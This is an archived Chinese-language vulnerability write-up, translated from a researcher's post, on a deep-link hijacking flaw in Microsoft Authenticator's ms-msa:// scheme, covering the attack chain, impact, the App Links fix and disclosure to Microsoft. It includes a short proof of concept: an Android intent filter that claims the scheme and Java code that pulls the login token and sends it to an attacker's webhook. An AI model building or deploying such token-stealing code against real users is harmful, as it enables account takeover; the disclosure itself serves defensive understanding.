@@ -1,0 +1,178 @@
+---
+cve: "CVE-2026-26123"
+source: "gelusus/wxvl 公众号漏洞文库"
+---
+
+#  【CVE-2026-26123】微软身份认证器 DeepLink 漏洞  
+原创 骨哥说事
+                    骨哥说事  骨哥说事   2026-03-26 06:51  
+  
+<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
+  
+#   
+  
+****# 防走失：https://gugesay.com/archives/5442  
+  
+******不想错过任何消息？设置星标****↓ ↓ ↓**  
+****  
+#   
+  
+  
+![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
+  
+![](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZgsHkW9U8bKfaQr7IGy5ricICiazy9pawG4KQbzkJdXcw32gRicsMjFJEYFYQ3X6pvOJ6OI963zmoVbuh9jm1iaVFm2kXbZe6Fl2EE/640?wx_fmt=png&from=appmsg "")  
+## 概述  
+  
+微软身份验证器用于安全引导用户登录或通过二维码启用双因素认证 (2FA) 的 ms-msa://  
+ 深层链接，实际上并未被该应用自身正确声明。  
+  
+这一疏忽造成了“完美风暴”：任何恶意应用都可以拦截身份验证令牌，导致完整的账户接管——绕过 2FA、密码要求和微软部署的每一层其他安全保护。  
+## 背景设定：当便利遭遇灾难  
+  
+想象一下：你正在手机上设置微软身份验证器。微软的网页界面生成了一个二维码。你用手机的原生摄像头（像大多数人那样）扫描它，点击 "打开链接"，然后……你刚刚把你的账户交给了攻击者。  
+  
+但关键是——你永远不会知道。  
+## 深度链接灾难剖析  
+## 什么是深层链接？  
+> Android 深层链接 (Android deep links) 让你可以将用户从其点击的链接（例如来自网页浏览、搜索、通知等）直接带入你的应用内容中。  
+  
+  
+深层链接是具有自定义协议的URL，用于启动特定应用。你到处都能看到它们：  
+- spotify://track/...  
+ 打开 Spotify  
+  
+- uber://  
+ 启动 Uber  
+  
+- ms-msa://  
+ 应该打开微软身份验证器  
+  
+这里的关键词是 **应该**  
+。  
+## 漏洞：一个数字遗弃案例  
+  
+当微软身份验证器为账户设置生成二维码时，它会创建如下深层链接：  
+```
+ms-msa://code=M.C544_BL2.2.U.60e61ddd-1d08-127d-d783-bda9b7v&uaid=88498cfad78b4669aaec4b7a1c8&expires=3964722534
+```  
+  
+这个令牌是金子。它是绕开一切——2FA、密码、安全问题——的直接身份验证凭证。是万能钥匙。  
+  
+现在，事情变得离谱了：**微软身份验证器实际上并未监听这个深层链接。**  
+  
+当深层链接从以下途径触发时：  
+- 原生手机二维码扫描器  
+  
+- 网页点击  
+  
+- ADB隐式意图  
+  
+结果呢？**错误。应用甚至都不打开。点击 "打开链接" 将打开攻击者的应用。**  
+  
+![file](https://mmbiz.qpic.cn/sz_mmbiz_png/TKdPSwEibsZhgibou16vOx6KicAaGIGcYdiaU3qADXhfJ4HjVtRkmWy4sJwmEz0wFH4MJ04wLzGlfapRvelZHwP15F7cxLEbpkF0CZ4FAePUpQ0/640?wx_fmt=png&from=appmsg "")  
+## 利用：深层链接劫持入门  
+  
+由于微软身份验证器 "抛弃" 了它自己的深层链接，任何应用都可以声明它。没有竞争。用户不会收到 "哪个应用应处理此操作？" 的提示。恶意应用默认获胜。  
+  
+这在最新的 Android 和 iOS 版本，以及最新的微软身份验证器版本上均有效。  
+## 构建 "伪造身份验证器"  
+  
+创建概念验证 (POC) 简单得几乎让人尴尬：  
+  
+**步骤 1:**  
+ 注册被遗弃的深层链接  
+```
+```  
+```
+<intent-filter>
+    <action android:name="android.intent.action.VIEW" />
+    <category android:name="android.intent.category.DEFAULT" />
+    <category android:name="android.intent.category.BROWSABLE" />
+    <data android:scheme="ms-msa" />
+</intent-filter>
+```  
+  
+  
+**步骤 2:**  
+ 提取并外传令牌  
+```
+Intent intent = getIntent();
+Uri data = intent.getData();
+String token = data.getQueryParameter("code");
+// 发送到攻击者的服务器
+sendToWebhook(token);
+```  
+  
+![file](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZiaGeOHMcyEuZ8FCuYWHF9yEMJmFWw6yiaMZmWTkgtIXiaBMr9yic02dqD91lcIDVDDoSrICMeys7FicnWRFQYY04Q6icAZib01GmJFyk/640?wx_fmt=png&from=appmsg "")  
+  
+**步骤 3:**  
+ 获利  
+  
+凭借窃取的令牌，攻击者可以：  
+1. 从身份验证器生成他们自己的 2FA 代码  
+  
+1. 通过身份验证器登录  
+  
+1. 获得完整的账户访问权限  
+  
+通过此途径可能受损的服务：  
+  
+电子邮件、Office、Microsoft Teams、OneDrive、Skype、Outlook 等。  
+  
+![file](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZgIL3CPe51QiaJWkCswqibpVNh7kg8PFdYFVXTk8GUDAsbRyz7Y0fm7oR5RnTQSKeA85KNvwibESCRvGaKs38ampdAzDe7dqN3qWU/640?wx_fmt=png&from=appmsg "")  
+## 攻击链  
+1. 受害者访问 [https://login.live.com/](https://login.live.com/)  
+  
+1. 合法的微软身份验证器链接页面  
+  
+1. 生成带有 ms-msa://  
+ 深层链接的二维码  
+  
+1. 受害者用原生摄像头扫描（标准操作）  
+  
+1. 手机显示 "打开链接" 提示  
+  
+1. 恶意应用拦截——微软身份验证器踪影全无  
+  
+1. 令牌发送到攻击者的服务器  
+  
+1. 攻击者登录  
+  
+## 影响：完整的账户接管  
+  
+这不是一个理论上的漏洞。其影响是严重的：  
+- **范围:**  
+ 所有微软账户服务（Outlook, OneDrive, Azure, Office 365）  
+  
+- **可绕过项:**  
+ 2FA、密码要求、安全警报  
+  
+- **可检测性:**  
+ 无。受害者不会收到任何通知  
+  
+该攻击需要最少的用户交互（扫描二维码——这是用户被训练去做的事），且恶意应用（除互联网访问外）无需获取任何可疑权限。  
+## 修复措施：正确实施应用链接 (App Links)  
+  
+解决方案很简单，但需要正确实施：  
+  
+只需实现应用链接验证即可。  
+## 对安全工程师和开发者的教训  
+  
+审计你的深层链接，实现应用链接验证，并记住身份验证流程值得最高级别的审查。毕竟，你可以拥有世界上最坚固的锁，但如果你把钥匙放在门垫下，一切都是徒劳。  
+  
+**关键且简单的漏洞仍然存在！**  
+## 时间线与披露  
+  
+此漏洞已得到认可 (CVE-2026–26123)，得到缓解，并已负责任地披露给微软安全响应中心 (MSRC)。该概念验证演示了问题，而不需要过多权限——仅仅是互联网权限——这使其格外危险。  
+  
+建议客户更新至最新版本。  
+  
+原文：https://khaledsec.medium.com/e0409a920a02?sk=df506976e7c2d15fd29e70725873f6e2  
+  
+**感谢阅读，如果觉得还不错的话，动动手指分享给更多喜爱的朋友～**  
+  
+
+
+---
+
+> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
